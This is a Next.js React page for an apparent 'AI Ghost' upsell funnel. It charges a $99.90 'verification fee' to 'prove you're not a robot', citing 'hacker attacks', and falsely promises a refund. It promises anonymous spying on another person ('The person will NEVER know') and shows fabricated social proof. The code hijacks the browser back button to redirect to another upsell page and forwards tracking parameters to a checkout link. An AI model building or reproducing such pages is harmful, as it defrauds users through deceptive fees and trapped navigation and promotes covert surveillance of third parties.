'use client';

import { motion } from 'framer-motion';
import { Suspense, useEffect } from 'react';
import { useSearchParams } from 'next/navigation';

function Up3Content() {
  const searchParams = useSearchParams();

  useEffect(() => {
    window.history.pushState(null, '', window.location.href);
    const handlePopState = () => {
      window.location.href = '/backdoup3';
    };
    window.addEventListener('popstate', handlePopState);
    return () => {
      window.removeEventListener('popstate', handlePopState);
    };
  }, []);

  const getUtmParams = () => {
    const utmKeys = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content', 'src', 'sck', 'xcod'];
    const params = new URLSearchParams();
    utmKeys.forEach(key => {
      const value = searchParams.get(key);
      if (value) params.set(key, value);
    });
    return params.toString();
  };

  const appendUtmToLink = (baseLink: string) => {
    const utmParams = getUtmParams();
    if (utmParams) {
      return `${baseLink}?${utmParams}`;
    }
    return baseLink;
  };

  return (
    <div className="min-h-screen relative overflow-x-hidden" style={{ background: '#0a0a0a' }}>
      <div className="relative z-10 flex items-center justify-center min-h-screen px-4 py-12">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5 }}
          className="max-w-[420px] w-full rounded-[24px] p-8 text-center"
          style={{
            background: '#121212',
            border: '1px solid #262626',
          }}
        >
          <div className="flex justify-center mb-6">
            <div className="w-[48px] h-[48px] rounded-xl overflow-hidden">
              <img src="/ghost-logo.png" alt="AI Ghost" className="w-full h-full object-cover" />
            </div>
          </div>

          <h1 className="text-white text-2xl font-bold leading-tight mb-6">
            FINAL STEP
          </h1>

          <p className="text-base mb-6 leading-relaxed text-[#A0A0A0]">
            You need to verify your identity and prove you&apos;re not a robot. We were experiencing hacker attacks on our servers.
          </p>

          <p className="text-white text-lg font-bold mb-4">
            Verification Fee: <span className="bg-clip-text text-transparent" style={{ backgroundImage: 'linear-gradient(135deg, #D62976, #FA7E1E)' }}>$99.90</span>
          </p>

          <p className="text-sm mb-8 leading-relaxed font-semibold bg-clip-text text-transparent" style={{ backgroundImage: 'linear-gradient(135deg, #D62976, #FA7E1E)' }}>
            But don&apos;t worry, this amount will be refunded once your account is confirmed in the system.
          </p>

          <a
            href={appendUtmToLink('https://go.centerpag.com/PPU38CQ89MU')}
            className="flex items-center justify-center gap-2 w-full py-4 px-6 rounded-full text-white font-bold text-base transition-all duration-300 hover:opacity-90 mb-4"
            style={{
              background: 'linear-gradient(135deg, #D62976 0%, #FA7E1E 50%, #FEDA75 100%)',
            }}
          >
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M9 12l2 2 4-4"/>
              <circle cx="12" cy="12" r="10"/>
            </svg>
            VERIFY MY ACCOUNT
          </a>

          <div className="flex items-center justify-center gap-2 text-sm text-[#808080]">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
              <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
            </svg>
            <span>100% Anonymous. The person will <span className="font-bold bg-clip-text text-transparent" style={{ backgroundImage: 'linear-gradient(135deg, #D62976, #FA7E1E)' }}>NEVER</span> know.</span>
          </div>
        </motion.div>

        <div className="absolute bottom-6 left-0 right-0 text-center">
          <p className="text-sm text-[#666]">+8,486 profiles analyzed today</p>
        </div>
      </div>
    </div>
  );
}

export default function Up3Page() {
  return (
    <Suspense fallback={<div className="min-h-screen" style={{ background: '#0a0a0a' }} />}>
      <Up3Content />
    </Suspense>
  );
}
